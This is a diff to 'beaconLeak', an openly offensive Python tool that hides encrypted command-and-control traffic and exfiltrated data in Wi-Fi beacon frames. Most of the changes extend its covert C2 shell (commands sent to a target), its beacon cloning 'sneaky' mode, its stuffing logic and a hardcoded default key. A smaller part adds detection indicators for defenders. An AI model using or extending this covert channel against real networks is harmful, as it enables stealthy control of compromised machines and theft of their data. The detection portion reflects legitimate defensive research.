@@ -5,17 +5,21 @@
 | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
 | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
 |___|___|__,|___|___|_|_|_____|___|__,|_,_|
-                        by cjcase [v0.8.55]
+                        by cjcase [v0.8.90]
 
 beaconLeak - Covert data exfiltration and detection using beacon stuffing (🥓)
 """
+import os
 import sys
 import time
 import shlex
+import syslog
+import hashlib
 import subprocess
 
 import nacl.utils
 import nacl.secret
+import nacl.pwhash
 
 from scapy.all import Dot11
 from scapy.all import Dot11Beacon
@@ -46,28 +50,34 @@ class beaconleak():
         # c2 commands
         self.shell_cmds = {
             '!help': 'print these commands',
-            '!download': 'downloads file from target',
+            # TODO download file flow
+            #'!download': 'downloads file from target',
+            #'!reset': 'resets own session and broadcasts session reset command',
             #'!upload': 'uploads file to target',
-            '!': 'send command to target without waiting for response',
+            '!': 'send command to target without waiting for response (e.g. !ls)',
             '!end': 'exit beaconshell',
         }
         # science
         self.detected = 0
         # user set
         self.debug = debug
-        # hardcoded passwords are no fun
+        # crypto magic
+        self.session = 0 # TODO crypto session/replay
+        self.salt = b'beaconleak::salt' # TODO crypto session/replay
         if not psk:
             self.psk = bytes.fromhex('299e29a4d36990bc479d6fed6551a94c7e3da6e10c8cdf9bab9e3c18a04ddee8')
         else:
-            self.psk = psk.encode('utf-8')
-        # crypto
+            self.psk = nacl.pwhash.argon2i.kdf(32, psk.encode('utf-8'), self.salt)
         self.box = nacl.secret.SecretBox(self.psk)
+        # custom beacon
         self.ssid = ssid
         if not ssid:
             self.ssid = 'linksys'
         self.bssid = bssid
         if not bssid:
             self.bssid = '00:14:bf:de:ad:c0'
+        # TODO check beacon size and do covert element 221 stuffing
+        self.marker = b'\x0b\x33'
 
     def cmd(self, cmd):
         if sys.platform == 'linux':
@@ -109,6 +119,7 @@ class beaconleak():
             _rates = Dot11Elt(ID="Rates", info=rates, len=len(rates))
             frame = RadioTap() / dot11 / beacon / _ssid / _rates / _rsninfo / _stuff
         else:
+            # TODO check beacon size and do covert element 221 stuffing
             frame = self.covert_frame / _stuff
         return frame
         
@@ -188,12 +199,12 @@ class beaconleak():
                 i = 0
                 elements = frame
                 while elements:
+                    # TODO fix error here, 128 is only a marker, must extract response from 254
                     if elements.ID == 128:
                         if self.debug:
                             print("[d] response frame:\n{}".format(frame.command()))
                             print("[d] received:{}".format(elements.info.hex()))
-                        crypted = elements.info
-                        msg = dec_payload(crypted)
+                        msg = dec_payload(elements.info)
                         print(msg.decode('utf-8'))
                     i = i + 1
                     elements = elements.payload
@@ -236,23 +247,19 @@ class beaconleak():
             time.sleep(2)
             sendp(frame, iface=self.iface, verbose=int(self.debug))
 
-
+    # TODO stuff element 221 for maximum lulz
     def magic(self, frame):
-        # TODO: implement covert logic
         if frame.haslayer(Dot11Beacon):
-            if frame.addr2 == self.bssid and frame[Dot11Elt][3].ID == 253:
-                self.do_magic(frame, 3)
-            else:
-                i = 0
-                elements = frame
-                while elements:
-                    if elements.ID == 128:
-                        break
-                    if elements.ID == 254:
-                        self.do_magic(frame, i)
-                        break
-                    i = i + 1
-                    elements = elements.payload
+            i = 0
+            elements = frame
+            while elements:
+                if elements.ID == 128:
+                    break
+                if elements.ID == 254:
+                    self.do_magic(frame, i)
+                    break
+                i = i + 1
+                elements = elements.payload
                
 
     def sniff(self, pcap=False):
@@ -271,10 +278,10 @@ class beaconleak():
                     sniff(iface=iface, prn=self.detect, monitor=True)
         except KeyboardInterrupt:
             print("\n[*] Done!")
-        except Exception as e:
-            print("[e] Error occurred while sniffing.")
-            if self.debug:
-                print("[d] error: {}".format(str(e)))
+        #except Exception as e:
+        #    print("[e] Error occurred while sniffing.")
+        #    if self.debug:
+        #        print("[d] error: {}".format(str(e)))
         
 
     def clone(self, frame):
@@ -286,7 +293,7 @@ class beaconleak():
                 rssi = -100
             self.beacons[frame.addr2] = (rssi, frame)
 
-    # this one is elite
+    # this one is 1337
     def sneaky(self):
         print("[*] Covert mode enabled:")
         # sniff frames around me
@@ -322,13 +329,28 @@ class beaconleak():
     # this is for the blue teamers
     def detect(self, frame):
         if frame.haslayer(Dot11Beacon):
+            ssid = frame.info.decode('utf-8')
             elements = frame.getlayer(Dot11Elt)
-            #if self.debug:
-            #    print(frame.command())
+            # TODO add MAC Adress validation detection case
+            # IoC: pyExfil defaults
+            if frame.addr2 == "00:00:00:00:00:42" or ssid == "pyExfil":
+                print("[!] Beacon Stuffing Detected! (SSID:{}, PyExfil Defaults".format(ssid))
+                if self.debug:
+                        print("[{}] Data: {}".format(self.detected, elements.info.hex()))
+                self.detected += 1
+                return
+            # IoC: beaconLeak defaults
+            if frame.addr2 == "00:14:bf:de:ad:c0":
+                print("[!] Beacon Stuffing Detected! (SSID:{}, beaconLeak Defaults".format(ssid))
+                if self.debug:
+                        print("[{}] Data: {}".format(self.detected, elements.info.hex()))
+                self.detected += 1
+                return
             while elements:
+                # IoC: Reserved Elements
                 if elements.ID in self.reserved:
                     # TODO: implement syslog functionality for IoCs
-                    print("[!] BEACON STUFFING DETECTED (SSID:{} Reserved Element {})".format(frame[Dot11Beacon].info.decode('utf-8'), elements.ID))
+                    print("[!] Beacon Stuffing Detected! (SSID:{} Reserved Element {})".format(ssid, elements.ID))
                     self.detected += 1
                     if self.debug:
                         print("[{}] Data: {}".format(self.detected, elements.info.hex()))
@@ -353,7 +375,7 @@ if __name__ == '__main__':
     | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
     | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
     |___|___|__,|___|___|_|_|_____|___|__,|_,_|
-                            by cjcase [v0.8.55]\n
+                            by cjcase [v0.8.90]\n
     """
     parse = argparse.ArgumentParser(add_help=True, formatter_class=argparse.RawTextHelpFormatter, description=banner)
     modes = parse.add_argument_group('modes')
@@ -416,6 +438,7 @@ if __name__ == '__main__':
         print(banner)
         if args.psk:
             print("[*] Using custom key, set up leaker to use it too.")
+            #print("[*] Salt: {}".format(self.salt.hex())) # TODO
         # chunky boi
         bl = beaconleak('c2', args.iface, 
             psk=args.psk, 
